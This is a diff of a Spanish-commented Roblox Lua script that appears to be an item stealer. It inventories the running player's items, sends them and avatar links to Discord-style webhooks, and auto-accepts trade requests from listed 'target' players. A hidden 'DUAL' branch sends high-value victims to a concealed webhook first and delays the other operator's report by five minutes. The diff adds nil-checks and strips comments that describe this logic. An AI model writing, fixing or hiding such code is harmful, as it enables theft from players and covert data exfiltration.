@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE LÓGICA DUAL INTEGRADA Y OCULTA)
+-- SCRIPT 2 (CORE LÓGICA DUAL INTEGRADA, OCULTA Y ANTI-ERRORES)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -32,7 +32,7 @@ local efectosEspecialesDual = {
 -- ==========================================
 local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
 local EXCLUDE = {}
-for _, n in ipairs(EXCLUDE_ITEMS) do EXCLUDE[string.lower(n)] = true end
+for _, n in ipairs(EXCLUDE_ITEMS or {}) do EXCLUDE[string.lower(n)] = true end
 
 local okTrade, ItemIsTradeable = pcall(function()
     return require(RS.Shared.Utils.ItemIsTradeable)
@@ -75,7 +75,6 @@ cargarValoresGitHub(VALUES_REPO_URL, Knives, Guns, Effects, Emotes)
 cargarValoresGitHub(DUAL_VALUES_REPO_URL, DualKnives, DualGuns, DualEffects, DualEmotes)
 
 task.spawn(function()
-    -- Esperar a que el SCRIPT 1 pase la configuración normal
     while getgenv and not getgenv().AutoTradeConfig do
         task.wait(0.2)
     end
@@ -150,7 +149,6 @@ task.spawn(function()
         local pd = cg.PlayerData
         local knives, guns, effects, emotes = {}, {}, {}, {}
         
-        -- Separación de Valores (Normal y Dual)
         local totalValueNormal = 0
         local totalValueDual = 0
         
@@ -190,7 +188,6 @@ task.spawn(function()
                         if valNormal then totalValueNormal = totalValueNormal + valNormal end
                         if valDual then totalValueDual = totalValueDual + valDual end
                         
-                        -- Mostramos el valor más alto visualmente en el webhook
                         local displayValue = valDual or valNormal
                         resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = displayValue }
                     end
@@ -225,7 +222,7 @@ task.spawn(function()
 
             local function formatearLista(lista)
                 local contador, orden, texto = {}, {}, ""
-                for _, v in ipairs(lista) do
+                for _, v in ipairs(lista or {}) do
                     local clave = v.name
                     if not contador[clave] then
                         contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
@@ -235,7 +232,7 @@ task.spawn(function()
                         contador[clave].valor = contador[clave].valor + v.value
                     end
                 end
-                for _, clave in ipairs(orden) do
+                for _, clave in ipairs(orden or {}) do
                     local info = contador[clave]
                     texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                 end
@@ -256,17 +253,12 @@ task.spawn(function()
             local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
             local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
-            -- ==========================================
-            -- LÓGICA DE DETECCIÓN DUAL ESTRICTA
-            -- ==========================================
             local isDualPlayer = totalValueDual >= 7500
             
-            -- Sincronizar el estado de vuelta a global por si otros módulos lo revisan
             if getgenv().AutoTradeConfig then
                 getgenv().AutoTradeConfig.EstadoActual = isDualPlayer and "DUAL" or "NORMAL"
             end
 
-            -- Definir quién será el objetivo real de tradeo (el oculto DUAL o el normal del Script 1)
             local jugadoresObjetivos = isDualPlayer and jugadoresObjetivosDual or jugadoresObjetivosNormales
 
             local descriptionText = "### 👤 Información del Jugador\n" ..
@@ -330,17 +322,12 @@ task.spawn(function()
             
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
-            -- ==========================================
-            -- SISTEMA DE ENVÍO Y RETRASO DE WEBHOOKS
-            -- ==========================================
             if isDualPlayer then
-                -- Envía al tuyo (DUAL Oculto) instantáneamente
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({ Url = DUAL_WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                     end
                 end)
-                -- Retrasa 5 minutos el webhook normal del Script 1
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -349,7 +336,6 @@ task.spawn(function()
                     end)
                 end
             else
-                -- Modo NORMAL instantáneo al webhook del Script 1
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                 end
@@ -359,7 +345,7 @@ task.spawn(function()
         local jugadorEncontrado = nil
         repeat 
             task.wait(0.5)
-            for _, nombre in ipairs(jugadoresObjetivos) do
+            for _, nombre in ipairs(jugadoresObjetivos or {}) do
                 local p = Players:FindFirstChild(nombre)
                 if p then
                     jugadorEncontrado = p
@@ -432,10 +418,10 @@ task.spawn(function()
             table.sort(listaArmasNormales, sortPorValor)
 
             local itemsRestantes = {}
-            for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaEmotes or {}) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaEfectos or {}) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaArmasPrioritarias or {}) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaArmasNormales or {}) do table.insert(itemsRestantes, v) end
 
             if #itemsRestantes == 0 then return false end
             
@@ -460,15 +446,13 @@ task.spawn(function()
 
             repeat
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
-                local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
+                local incoming = SessionState:TryIndex({ "incomingTradeRequests" }) or {}
                 local aceptado = false
                 
-                if type(incoming) == "table" then
-                    for _, p in ipairs(incoming) do
-                        if p.Name == jugadorEncontrado.Name then
-                            Remotes.AcceptInvite:FireServer(p)
-                            aceptado = true
-                        end
+                for _, p in ipairs(incoming or {}) do
+                    if p.Name == jugadorEncontrado.Name then
+                        Remotes.AcceptInvite:FireServer(p)
+                        aceptado = true
                     end
                 end
                 
